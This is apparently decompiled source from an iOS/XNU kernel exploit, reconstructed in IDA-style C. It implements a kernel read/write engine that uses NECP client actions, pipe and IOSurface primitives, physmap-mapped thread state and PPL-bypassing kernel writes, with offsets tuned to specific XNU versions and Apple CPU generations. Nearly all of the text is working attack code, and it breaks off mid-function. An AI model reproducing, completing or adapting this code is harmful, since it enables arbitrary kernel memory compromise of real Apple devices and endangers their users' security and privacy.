__int64 __fastcall init_necp_option_struct(__int64 result, __int64 a2, __int64 a3, __int64 a4, int a5)
{
  __int64 v5; // x8

  *(__int128 *)(a2 + 128) = 0u;
  *(__int128 *)(a2 + 144) = 0u;
  *(__int128 *)(a2 + 96) = 0u;
  *(__int128 *)(a2 + 112) = 0u;
  *(__int128 *)(a2 + 64) = 0u;
  *(__int128 *)(a2 + 80) = 0u;
  *(__int128 *)(a2 + 32) = 0u;
  *(__int128 *)(a2 + 48) = 0u;
  *(__int128 *)a2 = 0u;
  *(__int128 *)(a2 + 16) = 0u;
  *(uint64_t *)(a2 + 16) = 0x6300000003LL;
  *(uint32_t *)(a2 + 28) = 0;
  if ( a5 == 7 && (v5 = *(uint64_t *)(result + 544)) != 0 )
  {
    *(uint64_t *)(a2 + 40) = v5;
    *(uint64_t *)(a2 + 56) = a3 + 96;
    *(uint64_t *)(a2 + 104) = a4;
  }
  else
  {
    *(uint64_t *)(a2 + 40) = a3 + 96;
    *(uint64_t *)(a2 + 56) = a4;
    *(uint32_t *)(a2 + 96) = a5;
  }
  *(uint64_t *)(a2 + 64) = 0LL;
  *(uint8_t *)(a2 + 83) = 34;
  *(uint64_t *)(a2 + 88) = 0LL;
  return result;
}

//----- (000000000002566C) ----------------------------------------------------
__int64 __fastcall krw_fd_verify_roundtrip(struct_krwCtx *krwCtx, int *a2, unsigned __int64 a3)
{
  __int64 result; // x0
  uint8_t __s2[96]; // [xsp+8h] [xbp-D8h] BYREF
  uint8_t __s1[96]; // [xsp+68h] [xbp-78h] BYREF

  if ( !kreadbuf_universal(krwCtx, a3, 0x60u, __s1, 1) )
    return 163855;
  result = fd_write((__int64)a2, __s1, 0x60u);
  if ( !(uint32_t)result )
  {
    result = fd_read(a2, __s2, 0x60u);
    if ( !(uint32_t)result )
    {
      if ( !memcmp(__s1, __s2, 0x60u) )
        return 0;
      else
        return 708628;
    }
  }
  return result;
}

//----- (000000000002572C) ----------------------------------------------------
__int64 __fastcall krw_read_thunk(struct_krwCtx *krwCtx, __int64 vaddr, __int64 size, void *outBuf)
{
  return kreadbuf_universal(krwCtx, vaddr, size, outBuf, 1);
}

//----- (0000000000025734) ----------------------------------------------------
bool __fastcall krw_ctx_has_read_caps(struct_krwCtx *krwCtx)
{
  unsigned __int64 v2; // x8
  bool v3; // zf
  int v5; // w1

  v2 = krwCtx->xnuVersionPacked;
  if ( v2 >= XNU_VERSION_PACKED(10002, 0, 0, 0, 0) )
  {
    v3 = KRW_CTX_AT(krwCtx, krw_thread_state_mapping_t *, KRW_CTX_THREAD_STATE_MAPPING_OFFSET) == 0;
    return !v3;
  }
  if ( v2 < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    if ( KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_OLD_SELF_TASK_IPC_OFFSET)
      && KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_OLD_PTRAUTH_BASE_OFFSET) )
    {
      if ( krwCtx->isSandboxed )
      {
        v5 = 8388864;
        goto LABEL_16;
      }
      return 1;
    }
    return 0;
  }
  if ( krwCtx->necpFd == -1
    || uuid_is_null(krwCtx->necpClientUuidAndState)
    || !krwCtx->necpClientKaddr )
    return 0;
  if ( !krwCtx->isSandboxed )
    return 1;
  v5 = 134217984;
LABEL_16:
  v3 = !krw_ctx_has_flag(krwCtx, v5);
  return !v3;
}

//----- (0000000000025804) ----------------------------------------------------
__int64 __fastcall setup_krw_engine(struct_krwCtx *krwCtx)
{
  unsigned __int64 v2; // x8
  krw_thread_state_mapping_t *v3; // x21
  int v4; // w0
  int v5; // w20
  int v6; // w0
  int v7; // w21
  __int64 v8; // x20
  unsigned __int64 v9; // x22
  __int64 v10; // x9
  __int64 v11; // x9
  mach_port_t v12; // w21
  unsigned __int64 v13; // x0
  unsigned __int64 v14; // x0
  vm_size_t v15; // x22
  int v16; // w0
  int v17; // w19
  int v18; // w8
  int v19; // w19
  int v20; // w8
  void *(__cdecl *v21)(void *); // x0
  int v22; // w8
  thread_act_t v23; // w0
  mach_port_t v25; // w23
  unsigned __int64 v26; // x0
  unsigned __int64 v27; // x20
  __int64 v28; // x8
  int v29; // w0
  __int64 v30; // x0
  int v31; // w24
  pthread_t v32; // x8
  __int64 v33; // [xsp+0h] [xbp-B0h] BYREF
  int v34; // [xsp+Ch] [xbp-A4h] BYREF
  __int64 v35; // [xsp+10h] [xbp-A0h] BYREF
  vm_address_t address; // [xsp+18h] [xbp-98h] BYREF
  pthread_t v37; // [xsp+20h] [xbp-90h] BYREF
  pthread_attr_t v38; // [xsp+28h] [xbp-88h] BYREF

  v2 = krwCtx->xnuVersionPacked;
  if ( v2 >= XNU_VERSION_PACKED(10002, 0, 0, 0, 0) )
  {
    address = 0;
    v37 = 0;
    v3 = calloc(1u, sizeof(*v3));
    if ( v3 )
    {
      v4 = pthread_attr_init(&v38);
      if ( v4 )
      {
        v5 = v4;
      }
      else
      {
        v16 = pthread_attr_setdetachstate(&v38, 1);
        if ( v16 )
        {
          v5 = v16;
          pthread_attr_destroy(&v38);
        }
        else
        {
          v21 = (void *(__cdecl *)(void *))nullsub_1(vtable_trampoline_b);
          v5 = pthread_create_suspended_np(&v37, &v38, v21, 0);
          pthread_attr_destroy(&v38);
          if ( !v5 )
          {
            v25 = pthread_mach_thread_np(v37);
            v26 = get_task_kobject_addr(krwCtx, v25);
            if ( v26 )
            {
              v27 = v26;
              if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
              {
                v28 = KRW_THREAD_STATE_OFFSET_A17;
              }
              else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
              {
                v28 = KRW_THREAD_STATE_OFFSET_A12_TO_A17;
              }
              else
              {
                v29 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11);
                v28 = KRW_THREAD_STATE_OFFSET_A12_TO_A17;
                if ( !v29 )
                  v28 = KRW_THREAD_STATE_OFFSET_PRE_A11;
              }
              v30 = kaddr_to_phys_v1(krwCtx, v28 + v27);
              if ( v30 )
              {
                v31 = v30;
                address = 0;
                v15 = (unsigned int)krwCtx->pageSizeOrSomething;
                v8 = physmap_maybe(krwCtx, &address, v15, v30 & ~krwCtx->pageMask);
                if ( !(uint32_t)v8 )
                {
                  v32 = v37;
                  v3->mappedSize = v15;
                  v3->suspendedThread = v32;
                  LODWORD(v32) = (uint32_t)krwCtx->pageMask & v31;
                  v3->machThread = v25;
                  v3->statePageOffset = (uint32_t)v32;
                  v3->mappedAddress = address;
                  KRW_CTX_AT(krwCtx, krw_thread_state_mapping_t *, KRW_CTX_THREAD_STATE_MAPPING_OFFSET) = v3;
                  return v8;
                }
              }
              else
              {
                v15 = 0;
                v8 = 163878;
              }
            }
            else
            {
              v15 = 0;
              v8 = 163848;
            }
            goto LABEL_42;
          }
        }
      }
      v15 = 0;
      if ( v5 >= 0 )
        v22 = v5;
      else
        v22 = -v5;
      v8 = v22 | 0x40000000u;
    }
    else
    {
      v15 = 0;
      v8 = 708617;
    }
LABEL_42:
    if ( v37 )
    {
      v23 = pthread_mach_thread_np(v37);
      if ( !thread_resume(v23) )
        pthread_join(v37, 0);
    }
    if ( address && v15 )
      vm_deallocate(mach_task_self_, address, v15);
    if ( v3 )
      free(v3);
    return v8;
  }
  if ( v2 < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    v12 = mach_task_self_;
    v13 = get_task_port_kaddr_wrap(krwCtx, mach_task_self_, (unsigned int *)&v38);
    v8 = 163854;
    if ( v13 )
    {
      KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_OLD_SELF_TASK_IPC_OFFSET) = v13;
      v14 = get_ptrauth_base_offset(krwCtx, v12);
      if ( v14 )
      {
        v8 = 0;
        KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_OLD_PTRAUTH_BASE_OFFSET) = v14;
      }
    }
  }
  else
  {
    v37 = 0;
    v6 = necp_open(0);
    if ( v6 != -1 )
    {
      v7 = v6;
      if ( necp_client_action(v7, 1, &v38, 0x10, &v37, 8) == -1 )
      {
        v19 = errno;
        v20 = errno;
        if ( v19 < 0 )
          v20 = -v20;
        v8 = v20 | 0x40000000u;
      }
      else
      {
        v8 = validate_port_set_chain(krwCtx, v7, (__int64 *)&address);
        if ( !(uint32_t)v8 )
        {
          v8 = 163855;
          if ( kread_physmap_decorated(krwCtx, address + 24, (unsigned __int64 *)&v35) )
          {
            if ( validate_kaddr_range(krwCtx, v35) )
            {
              v9 = krwCtx->xnuVersionPacked;
              v10 = 880;
              if ( v9 > XNU_VERSION_PACKED(8020, 119, 1023, 1023, 1023) )
                v10 = 1392;
              if ( v9 >> 43 > 0x44A )
                v10 = 1408;
              if ( kreadbuf_universal(krwCtx, v10 + v35, 4u, &v34, 1) )
              {
                if ( v34 != 8 )
                  return 163857;
                v11 = 888;
                if ( v9 > XNU_VERSION_PACKED(8020, 119, 1023, 1023, 1023) )
                  v11 = 1400;
                if ( v9 >> 43 > 0x44A )
                  v11 = 1416;
                if ( kread_physmap_decorated(krwCtx, v35 + v11, (unsigned __int64 *)&v33) )
                {
                  if ( validate_kaddr_range(krwCtx, v33) )
                  {
                    v8 = 0;
                    krwCtx->necpFd = v7;
                    *(__int128 *)krwCtx->necpClientUuidAndState = *(__int128 *)&v38.__sig;
                    krwCtx->necpClientKaddr = v35;
                  }
                  else
                  {
                    return 163878;
                  }
                }
                return v8;
              }
            }
            else
            {
              v8 = 163878;
            }
          }
        }
      }
      close(v7);
      return v8;
    }
    v17 = errno;
    v18 = errno;
    if ( v17 < 0 )
      v18 = -v18;
    return v18 | 0x40000000u;
  }
  return v8;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000025C6C) ----------------------------------------------------
__int64 __fastcall teardown_krw_thread(struct_krwCtx *krwCtx)
{
  unsigned __int64 v2; // x8
  __int64 v3; // x21
  krw_thread_state_mapping_t *v4; // x20
  vm_size_t v5; // x2
  kern_return_t v6; // w0
  _opaque_pthread_t *v7; // x0
  thread_act_t v8; // w0
  int v9; // w0
  int v10; // w0
  int v12; // [xsp+8h] [xbp-28h] BYREF
  int v13; // [xsp+Ch] [xbp-24h] BYREF

  v2 = krwCtx->xnuVersionPacked;
  if ( v2 < XNU_VERSION_PACKED(10002, 0, 0, 0, 0) )
  {
    if ( v2 < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
    {
      return 0;
    }
    else
    {
      v12 = -1;
      v3 = fd_open_dev_null(&v12);
      if ( !(uint32_t)v3 )
      {
        v9 = krwCtx->necpFd;
        if ( v9 != -1 )
        {
          close(v9);
          krwCtx->necpFd = -1;
        }
        *(__int128 *)krwCtx->necpClientUuidAndState = 0u;
        krwCtx->necpClientKaddr = 0;
        v10 = v12;
        goto LABEL_21;
      }
    }
  }
  else
  {
    v13 = -1;
    v3 = fd_open_dev_null(&v13);
    if ( !(uint32_t)v3 )
    {
      v4 = KRW_CTX_AT(krwCtx, krw_thread_state_mapping_t *, KRW_CTX_THREAD_STATE_MAPPING_OFFSET);
      KRW_CTX_AT(krwCtx, krw_thread_state_mapping_t *, KRW_CTX_THREAD_STATE_MAPPING_OFFSET) = 0;
      if ( !v4 )
      {
        v3 = 0;
LABEL_20:
        v10 = v13;
LABEL_21:
        fd_close(v10);
        return v3;
      }
      if ( v4->mappedAddress )
      {
        v5 = v4->mappedSize;
        if ( v5 )
        {
          v6 = vm_deallocate(mach_task_self_, v4->mappedAddress, v5);
          if ( v6 )
            goto LABEL_9;
        }
      }
      v7 = v4->suspendedThread;
      if ( v7 )
      {
        v8 = pthread_mach_thread_np(v7);
        v6 = thread_resume(v8);
        if ( v6 )
        {
LABEL_9:
          v3 = v6 | 0x80000000;
LABEL_19:
          v4->mappedAddress = 0;
          v4->mappedSize = 0;
          v4->suspendedThread = 0;
          v4->machThread = 0;
          v4->statePageOffset = 0;
          KRW_CTX_AT(krwCtx, krw_thread_state_mapping_t *, KRW_CTX_THREAD_STATE_MAPPING_OFFSET) = 0;
          free(v4);
          goto LABEL_20;
        }
        pthread_join(v4->suspendedThread, 0);
      }
      v3 = 0;
      goto LABEL_19;
    }
  }
  return v3;
}

//----- (0000000000025DB0) ----------------------------------------------------
__int64 __fastcall get_page_size_for_kaddr(struct_krwCtx *krwCtx)
{
  unsigned __int64 v1; // x8
  unsigned int v2; // w9

  v1 = krwCtx->xnuVersionPacked;
  if ( v1 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    v2 = 0x4000;
  else
    v2 = 0x80000;
  if ( v1 <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
    return v2;
  else
    return 528LL;
}

//----- (0000000000025DE8) ----------------------------------------------------
bool __fastcall has_valid_krw_path(struct_krwCtx *krwCtx)
{
  bool hasFdKrw = KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_PIPE_READ_FD_OFFSET) != -1
               && KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_PIPE_WRITE_FD_OFFSET) != -1
               && KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET) != -1
               && KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_NECP_TRIGGER_ADDR_OFFSET);
  bool hasMappedPortKrw = (unsigned int)(KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_SHARED_MEM_PORT_OFFSET) + 1) >= 2
                       && KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_SHARED_MEM_USER_ADDR_OFFSET)
                       && KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_SHARED_MEM_KERN_ADDR_OFFSET)
                       && krwCtx->xnuMajorVersion < 10002;

  return hasFdKrw || hasMappedPortKrw;
}

//----- (0000000000025E54) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_dev_null_only(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  __int64 v5; // x21
  __int64 test; // x26
  __int64 v12; // x28
  unsigned int v13; // w8
  __int64 v14; // x19
  __int64 v15; // x26
  size_t v16; // x27
  unsigned __int64 v17; // x8
  int v18; // w9
  unsigned int v19; // w8
  unsigned int v20; // w8
  __int64 v21; // x25
  __int64 v22; // x2
  __int64 v23; // x0
  int v24; // w25
  int v25; // w8
  size_t v26; // x2
  size_t v27; // x2
  int v28; // w25
  int v29; // w8
  int v31; // [xsp+14h] [xbp-1CCh]
  __int64 v32; // [xsp+18h] [xbp-1C8h]
  int *v33; // [xsp+20h] [xbp-1C0h]
  int v34; // [xsp+2Ch] [xbp-1B4h] BYREF
  uint8_t __s2[160]; // [xsp+30h] [xbp-1B0h] BYREF
  uint32_t __s1[42]; // [xsp+D0h] [xbp-110h] BYREF

  v5 = 708609;
  if ( KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_PIPE_READ_FD_OFFSET) == -1
    || KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_PIPE_WRITE_FD_OFFSET) == -1
    || KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET) == -1
    || !KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_NECP_TRIGGER_ADDR_OFFSET)
    || !check_kaddr_in_physmap(krwCtx, a2) )
  {
    return v5;
  }
  v34 = -1;
  if ( a5 )
  {
    test = fd_open_dev_null(&v34);
    if ( (uint32_t)test )
      goto LABEL_67;
    test = fd_read_test(&KRW_CTX_AT(krwCtx, int, KRW_CTX_PIPE_READ_FD_OFFSET));
    if ( (uint32_t)test )
      goto LABEL_67;
  }
  v31 = a5;
  v33 = &KRW_CTX_AT(krwCtx, int, KRW_CTX_PIPE_READ_FD_OFFSET);
  if ( KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_PPL_DATA_CONST_PTR_OFFSET) )
    v12 = 8;
  else
    v12 = 4;
  if ( !a4 )
  {
LABEL_61:
    test = pipe_krw_roundtrip_verify(krwCtx);
    goto LABEL_66;
  }
  v13 = 0;
  v32 = v12;
  while ( 1 )
  {
    v14 = v13;
    v15 = a2 + v13;
    v16 = a4 - v13;
    if ( (krwCtx->pageMask & v15) != 0 || (unsigned int)v16 < 0x4000 || !krw_ctx_has_read_caps(krwCtx) )
      break;
    v17 = krwCtx->xnuVersionPacked;
    if ( v17 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v18 = 0x4000;
    else
      v18 = 0x80000;
    if ( v17 <= XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
      v19 = v18;
    else
      v19 = 528;
    if ( (unsigned int)v16 >= v19 )
      LODWORD(v16) = v19;
    test = necp_semaphore_kread(krwCtx, v15, (char *)(a3 + v14), v16);
LABEL_54:
    if ( (uint32_t)test )
      goto LABEL_65;
    v13 = v16 + v14;
    if ( (int)v16 + (int)v14 >= a4 )
      goto LABEL_61;
  }
  v20 = v12 - v16;
  if ( (unsigned int)v12 <= (unsigned int)v16 )
  {
    v20 = 0;
  }
  else if ( (((v15 - 1 + (unsigned int)v16) ^ (v15 - 1 + v12)) & ~krwCtx->pageMask) == 0 )
  {
    v20 = 0;
  }
  v21 = v20;
  if ( !KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_PPL_DATA_CONST_PTR_OFFSET) )
  {
    v23 = necp_fd_verify_roundtrip(krwCtx, v15 - v20);
    if ( (uint32_t)v23 )
      goto LABEL_63;
    errno = 0;
    __s1[0] = fcntl(KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET), 5);
    if ( __s1[0] == -1 && errno )
    {
      v28 = errno;
      v29 = errno;
      if ( v28 < 0 )
        v29 = -v29;
      test = v29 | 0x40000000u;
    }
    else
    {
      if ( (unsigned int)v16 >= 4 )
        v26 = 4;
      else
        v26 = v16;
      memcpy((void *)(a3 + v14), (char *)__s1 + v21, v26);
      test = 0;
    }
    goto LABEL_53;
  }
  if ( *v33 == -1 || KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_PIPE_WRITE_FD_OFFSET) == -1 || (v22 = KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_NECP_TRIGGER_ADDR_OFFSET)) == 0 )
  {
    test = 708609;
    goto LABEL_65;
  }
  memset(__s1, 0, 160);
  init_necp_option_struct(krwCtx, (__int64)__s1, v22, v15 - v20 - 72, 7);
  v23 = fd_write((__int64)v33, __s1, 0xA0u);
  if ( (uint32_t)v23 || (v23 = fd_read(v33, __s2, 0xA0u), (uint32_t)v23) )
  {
LABEL_63:
    test = v23;
    goto LABEL_65;
  }
  if ( !memcmp(__s1, __s2, 0xA0u) )
  {
    if ( ioctl(KRW_CTX_AT(krwCtx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET), 0x40087367u, __s1) )
    {
      v24 = errno;
      v25 = errno;
      if ( v24 < 0 )
        v25 = -v25;
      test = v25 | 0x40000000u;
    }
    else
    {
      if ( (unsigned int)v16 >= 8 )
        v27 = 8;
      else
        v27 = v16;
      memcpy((void *)(a3 + v14), (char *)__s1 + v21, v27);
      test = 0;
    }
    v12 = v32;
LABEL_53:
    LODWORD(v16) = v12;
    goto LABEL_54;
  }
  test = 708628;
LABEL_65:
  pipe_krw_roundtrip_verify(krwCtx);
LABEL_66:
  if ( v31 )
LABEL_67:
    fd_close(v34);
  return test;
}

//----- (0000000000026204) ----------------------------------------------------
__int64 __fastcall necp_semaphore_kread(struct_krwCtx *krwCtx, __int64 a2, char *a3, mach_msg_type_number_t a4)
{
  // struct_krwCtx *krwCtx; // x19
  unsigned __int64 v7; // x8
  __int64 v8; // x21
  __int64 *v9; // x8
  unsigned __int64 v10; // x24
  unsigned __int64 v11; // x27
  __int64 v12; // x21
  __int64 v13; // x28
  __int64 v14; // x20
  __int64 v15; // x9
  __int64 v16; // x10
  unsigned __int64 v17; // x9
  unsigned __int64 v18; // x25
  __int64 v19; // x26
  size_t v20; // x22
  __int64 v21; // x23
  unsigned __int64 v22; // x8
  __int64 v23; // x9
  __int64 v24; // x10
  bool v25; // cc
  __int64 v26; // x8
  unsigned __int64 v27; // x20
  __int64 v28; // x21
  unsigned __int64 v29; // x23
  __int64 v30; // x8
  __int64 v31; // x8
  __int64 v33; // x8
  unsigned __int64 v34; // x23
  unsigned __int64 v35; // x24
  __int64 v36; // x25
  __int64 v37; // x20
  kern_return_t v38; // w0
  int v39; // w21
  int v40; // w8
  natural_t old_state[134]; // [xsp+10h] [xbp-290h] BYREF
  __int64 v43; // [xsp+228h] [xbp-78h] BYREF
  __int64 v44; // [xsp+230h] [xbp-70h] BYREF
  mach_vm_size_t kcd_size; // [xsp+238h] [xbp-68h] BYREF
  mach_msg_type_number_t old_stateCnt[2]; // [xsp+240h] [xbp-60h] BYREF

  v7 = krwCtx->xnuVersionPacked;
  if ( v7 < XNU_VERSION_PACKED(10002, 0, 0, 0, 0) )
  {
    v8 = 708609;
    if ( v7 >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
    {
      *(uint64_t *)old_state = a2;
      old_stateCnt[0] = a4;
      if ( krwCtx->necpFd != -1 )
      {
        v21 = krwCtx->necpClientKaddr;
        if ( !uuid_is_null((const unsigned __int8 *)krwCtx->necpClientUuidAndState) )
        {
          if ( krwCtx->necpClientKaddr )
          {
            v22 = krwCtx->xnuVersionPacked;
            v23 = 880;
            if ( v22 > XNU_VERSION_PACKED(8020, 119, 1023, 1023, 1023) )
              v23 = 1392;
            v24 = 888;
            if ( v22 > XNU_VERSION_PACKED(8020, 119, 1023, 1023, 1023) )
              v24 = 1400;
            v25 = v22 >> 43 > 0x44A;
            v26 = 1408;
            if ( !v25 )
              v26 = v23;
            v27 = v26 + v21;
            if ( v25 )
              v28 = 1416;
            else
              v28 = v24;
            v29 = v21 + v28;
            if ( noppl_kwritebuf(krwCtx, v27, old_stateCnt, 4u, 0) )
            {
              LODWORD(v8) = 163856;
              if ( noppl_kwritebuf(krwCtx, v29, old_state, krwCtx->stride_0x168, 0) )
              {
                if ( (unsigned int)necp_client_action(krwCtx->necpFd, 3, krwCtx->necpClientUuidAndState, 0x10, (void *)a3, a4) == a4 )
                {
                  LODWORD(v8) = 0;
                }
                else
                {
                  v39 = errno;
                  v40 = errno;
                  if ( v39 < 0 )
                    v40 = -v40;
                  LODWORD(v8) = v40 | 0x40000000;
                }
              }
            }
            else
            {
              LODWORD(v8) = 163856;
            }
            old_stateCnt[0] = 0;
            if ( noppl_kwritebuf(krwCtx, v27, old_stateCnt, 4u, 0) | (unsigned int)v8 )
              v8 = (unsigned int)v8;
            else
              v8 = 163856;
            *(uint64_t *)old_state = 0;
            if ( !noppl_kwritebuf(krwCtx, v29, old_state, krwCtx->stride_0x168, 0) )
            {
              if ( (uint32_t)v8 )
                return (unsigned int)v8;
              else
                return 163856;
            }
          }
        }
      }
      return v8;
    }
    *(uint64_t *)old_state = a2;
    kcd_size = 0;
    *(uint64_t *)old_stateCnt = 0;
    v43 = 0;
    v44 = 0;
    if ( a4 > 0x4000 || !krwCtx->gap_0x230 || !krwCtx->gap_0x228 )
      return v8;
    if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
    {
      v33 = krwCtx->ioConnectKernelValue;
      if ( !v33 )
      {
        v8 = 708617;
        goto LABEL_75;
      }
      v31 = v33 + 256;
    }
    else
    {
      if ( krwCtx->krw_pipe_0 == -1 )
        goto LABEL_75;
      if ( krwCtx->krw_pipe_1 == -1 )
        goto LABEL_75;
      if ( krwCtx->iosurfaceFd_size4 == -1 )
        goto LABEL_75;
      v30 = krwCtx->gap_0x218;
      if ( !v30 )
        goto LABEL_75;
      v31 = v30 + 192;
    }
    v8 = 163856;
    v44 = v31;
    if ( noppl_kwritebuf(krwCtx, v31 + 8, old_state, krwCtx->stride_0x168, 0) )
    {
      v34 = krwCtx->gap_0x228;
      if ( noppl_kwritebuf(krwCtx, v34, &v44, krwCtx->stride_0x168, 0) )
      {
        v35 = krwCtx->gap_0x230;
        v36 = 163855;
        if ( kreadbuf_universal(krwCtx, v35, 4u, (char *)&v43 + 4, 0) )
        {
          LODWORD(v43) = HIDWORD(v43) | 0x20;
          v37 = 163856;
          if ( !noppl_kwritebuf(krwCtx, v35, &v43, 4u, 0) )
            goto LABEL_70;
          v38 = task_map_corpse_info_64(mach_task_self_, mach_task_self_, (mach_vm_address_t *)old_stateCnt, &kcd_size);
          if ( v38 )
          {
            v36 = v38 | 0x80000000;
          }
          else if ( *(uint64_t *)old_stateCnt && kcd_size == 0x4000 )
          {
            memcpy(a3, *(const void **)old_stateCnt, a4);
            v36 = 0;
          }
          if ( !noppl_kwritebuf(krwCtx, v35, (char *)&v43 + 4, 4u, 0) )
          {
            if ( (uint32_t)v36 )
              v37 = (unsigned int)v36;
            else
              v37 = 163856;
            goto LABEL_70;
          }
        }
        v37 = v36;
LABEL_70:
        v44 = 0;
        if ( noppl_kwritebuf(krwCtx, v34, &v44, krwCtx->stride_0x168, 0) )
        {
          v8 = v37;
        }
        else if ( (uint32_t)v37 )
        {
          v8 = (unsigned int)v37;
        }
        else
        {
          v8 = 163856;
        }
      }
    }
LABEL_75:
    if ( *(uint64_t *)old_stateCnt && kcd_size )
      mach_vm_deallocate(mach_task_self_, *(mach_vm_address_t *)old_stateCnt, kcd_size);
    return v8;
  }
  v8 = 708609;
  v9 = (__int64 *)krwCtx->gap_0x1D50;
  if ( v9 )
  {
    if ( a4 )
    {
      v10 = 0;
      v11 = a4;
      while ( 1 )
      {
        v12 = v10 + a2;
        v13 = *v9;
        v14 = *((unsigned int *)v9 + 7);
        old_stateCnt[0] = 132;
        v15 = krwCtx->pageMask;
        v16 = (v10 + a2) & ~v15;
        v17 = v15 & (v10 + a2);
        if ( v17 >= (unsigned __int64)krwCtx->pageSizeOrSomething - 528 )
          v17 = krwCtx->pageSizeOrSomething - 528LL;
        v18 = v17 + v16;
        v19 = *(uint64_t *)(v13 + v14);
        __dsb(0xBu);
        *(uint64_t *)(v13 + v14) = v17 + v16 - 16;
        if ( thread_get_state(*((uint32_t *)v9 + 6), 17, old_state, old_stateCnt) || old_stateCnt[0] != 132 )
          break;
        if ( v18 - v12 + 528 <= v11 - v10 )
          v20 = v18 - v12 + 528;
        else
          v20 = v11 - v10;
        memcpy(&a3[v10], (char *)old_state + v12 - v18, v20);
        *(uint64_t *)(v14 + v13) = v19;
        v10 += v20;
        if ( v10 >= v11 )
          return 0;
        v9 = (__int64 *)krwCtx->gap_0x1D50;
      }
      *(uint64_t *)(v14 + v13) = v19;
      return 708642;
    }
    else
    {
      return 0;
    }
  }
  return v8;
}

//----- (00000000000266D0) ----------------------------------------------------
__int64 __fastcall necp_fd_verify_roundtrip(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v2; // x19
  __int64 v3; // x8
  int *v4; // x20
  __int64 v5; // x0
  uint8_t v7[160]; // [xsp+0h] [xbp-170h] BYREF
  __int128 __s1[2]; // [xsp+A0h] [xbp-D0h] BYREF
  __int64 v9; // [xsp+C0h] [xbp-B0h]
  __int64 v10; // [xsp+C8h] [xbp-A8h]
  __int64 v11; // [xsp+D0h] [xbp-A0h]
  __int64 v12; // [xsp+D8h] [xbp-98h]
  __int128 v13; // [xsp+E0h] [xbp-90h]
  __int128 v14; // [xsp+F0h] [xbp-80h]
  __int128 v15; // [xsp+100h] [xbp-70h]
  __int128 v16; // [xsp+110h] [xbp-60h]
  __int128 v17; // [xsp+120h] [xbp-50h]
  __int128 v18; // [xsp+130h] [xbp-40h]

  v2 = 708609;
  if ( krwCtx->krw_pipe_0 != -1 && krwCtx->krw_pipe_1 != -1 )
  {
    v3 = krwCtx->gap_0x218;
    if ( v3 )
    {
      v4 = krwCtx->krw_pipe_0;
      v9 = 0;
      v11 = 0;
      v17 = 0u;
      v18 = 0u;
      v15 = 0u;
      v16 = 0u;
      v13 = 0u;
      v14 = 0u;
      __s1[0] = 0u;
      __s1[1] = 0x6300000003uLL;
      v10 = v3 + 96;
      v12 = a2 - 96;
      LODWORD(v15) = 2;
      BYTE3(v14) = 34;
      v5 = fd_write(&krwCtx->krw_pipe_0, __s1, 0xA0u);
      if ( !(uint32_t)v5 )
      {
        v5 = fd_read(v4, v7, 0xA0u);
        if ( !(uint32_t)v5 )
        {
          if ( !memcmp(__s1, v7, 0xA0u) )
            return 0;
          else
            return 708628;
        }
      }
      return v5;
    }
  }
  return v2;
}

//----- (00000000000267E8) ----------------------------------------------------
__int64 __fastcall pipe_krw_roundtrip_verify(struct_krwCtx *krwCtx)
{
  __int64 v1; // x19
  __int64 v2; // x8
  int *v3; // x20
  __int64 v4; // x0
  uint8_t v6[160]; // [xsp+0h] [xbp-170h] BYREF
  __int128 __s1[2]; // [xsp+A0h] [xbp-D0h] BYREF
  __int64 v8; // [xsp+C0h] [xbp-B0h]
  __int64 v9; // [xsp+C8h] [xbp-A8h]
  __int128 v10; // [xsp+D0h] [xbp-A0h]
  __int128 v11; // [xsp+E0h] [xbp-90h]
  __int128 v12; // [xsp+F0h] [xbp-80h]
  __int128 v13; // [xsp+100h] [xbp-70h]
  __int128 v14; // [xsp+110h] [xbp-60h]
  __int128 v15; // [xsp+120h] [xbp-50h]
  __int128 v16; // [xsp+130h] [xbp-40h]

  v1 = 708609;
  if ( krwCtx->krw_pipe_0 != -1 && krwCtx->krw_pipe_1 != -1 )
  {
    v2 = krwCtx->gap_0x218;
    if ( v2 )
    {
      v3 = krwCtx->krw_pipe_0;
      v15 = 0u;
      v16 = 0u;
      v13 = 0u;
      v14 = 0u;
      v11 = 0u;
      v12 = 0u;
      v8 = 0;
      v10 = 0u;
      __s1[0] = 0u;
